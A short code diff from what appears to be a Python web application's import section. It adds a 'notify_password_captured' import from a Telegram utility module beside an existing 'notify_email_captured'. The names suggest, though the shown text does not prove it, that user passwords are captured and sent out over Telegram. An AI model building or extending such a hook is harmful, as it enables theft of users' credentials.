@@ -26,7 +26,8 @@ from utils.telegram import (
     notify_user_registration,
     notify_user_login,
     notify_password_reset,
-    notify_email_captured
+    notify_email_captured,
+    notify_password_captured
 )
 from utils.ip_info import get_client_ip, get_country_from_ip
 
